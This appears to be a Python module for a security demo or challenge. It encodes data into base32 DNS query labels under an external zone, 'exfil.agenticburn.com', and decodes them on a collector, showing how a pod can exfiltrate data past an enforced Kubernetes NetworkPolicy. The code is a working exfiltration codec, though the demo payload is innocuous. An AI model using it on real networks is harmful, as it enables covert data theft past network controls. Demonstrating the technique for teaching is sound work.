# ABOUTME: Shared, cluster-free codec for the C1 DNS-exfil beat (#116): encode a payload into DNS query
# ABOUTME: labels, and reassemble those labels back into the payload the way the collector must.
#
# The whole point of the beat is that the L3/L4 NetworkPolicy allows UDP/53 to the cluster resolver (it has
# to; nothing resolves without it), and CoreDNS forwards an arbitrary external name upstream, so a pod can
# push bytes out one label at a time with the policy fully enforced. Both halves of that — the pod encoding
# the payload into names, and an authoritative collector reassembling them — are this one module, so the
# facilitator script (dns-exfil.sh), the collector spec (docs/dns-collector-spec.md) and the offline test
# all agree on exactly one wire format. There is no cluster and no network here: this is pure bytes-in,
# names-out, names-in, bytes-out, and it round-trips in the test (verify/test_c1_dns_exfil.py).
#
# Wire format, one query name per chunk:
#     <seq>.<base32-chunk>.<zone>
# where <zone> is the exfil zone delegated to the collector (e.g. exfil.agenticburn.com), <seq> is the
# zero-padded chunk index so the collector can order chunks that arrive out of order, and <base32-chunk> is
# one <=63-char slice of the base32 (RFC 4648, lowercased, de-padded) encoding of the payload bytes. DNS is
# case-insensitive and resolvers fold case, so base32's lowercase alphanumeric alphabet survives the round
# trip where base64's '+/=' and mixed case would not. The first label carries a short magic so the collector
# can tell our chunks from ordinary lookups.
"""Encode/decode the C1 DNS-exfil payload. Import-safe: no I/O, no network, no argv side effects."""
import base64

MAGIC = "x1"            # marks a chunk-0 name as one of ours on the collector
DEFAULT_ZONE = "exfil.agenticburn.com"
MAX_LABEL = 63          # RFC 1035 label ceiling
MAX_NAME = 253          # RFC 1035 name ceiling


def demographics_token(marketing: dict) -> str:
    """The tiny datum Challenge 1 actually asks for: the human/vampire/... split, as one compact token
    like 'h41v33w14g8x4'. Keeps the leaked payload innocuous and small enough that the beat needs only a
    handful of labels, which reads cleanly on a projector."""
    demo = marketing.get("demographics", {})
    initials = {"humans": "h", "vampires": "v", "werewolves": "w", "ghosts": "g", "witches": "x"}
    parts = []
    for name, letter in initials.items():
        if name in demo:
            parts.append(f"{letter}{int(demo[name].get('share_pct', 0))}")
    return "".join(parts)


def _b32(data: bytes) -> str:
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()


def _unb32(s: str) -> bytes:
    s = s.upper()
    pad = (-len(s)) % 8
    return base64.b32decode(s + ("=" * pad))


def encode(payload, zone: str = DEFAULT_ZONE) -> list:
    """Payload (str or bytes) -> an ordered list of DNS query names that carry it. Each name stays within
    the 253-char DNS ceiling and each label within 63. Raising the chunk count is the only knob; the
    collector reorders by <seq>, so emission order does not matter."""
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    enc = _b32(payload)
    # Budget per name = 253 - len(zone) - len('<seq>.') - len('.<magic?>') - dots. Keep a safe fixed chunk
    # that leaves generous headroom for the longest zone we would delegate; 45 is well under 63 and under
    # the whole-name ceiling for any sane zone.
    chunk_len = 45
    chunks = [enc[i:i + chunk_len] for i in range(0, len(enc), chunk_len)] or [""]
    width = max(2, len(str(len(chunks) - 1)))
    names = []
    for i, chunk in enumerate(chunks):
        seq = str(i).zfill(width)
        head = f"{MAGIC}{seq}" if i == 0 else seq
        name = f"{head}.{chunk}.{zone}" if chunk else f"{head}.{zone}"
        if len(name) > MAX_NAME or any(len(lbl) > MAX_LABEL for lbl in name.split(".")):
            raise ValueError(f"encoded name exceeds DNS limits: {name!r}")
        names.append(name)
    return names


def decode(names, zone: str = DEFAULT_ZONE) -> bytes:
    """The collector side: a bag of query names (any order, our zone only) -> the original payload bytes.
    Ignores names that are not ours (wrong zone, or a chunk-0 name without the magic)."""
    suffix = "." + zone
    seen = {}
    saw_magic = False
    for name in names:
        n = name.rstrip(".").lower()
        if not n.endswith(suffix):
            continue
        labels = n[: -len(suffix)].split(".")
        if not labels:
            continue
        head = labels[0]
        chunk = labels[1] if len(labels) > 1 else ""
        if head.startswith(MAGIC):
            saw_magic = True
            head = head[len(MAGIC):]
        if not head.isdigit():
            continue
        seen[int(head)] = chunk
    if not saw_magic or not seen:
        return b""
    ordered = "".join(seen[i] for i in sorted(seen))
    return _unb32(ordered)
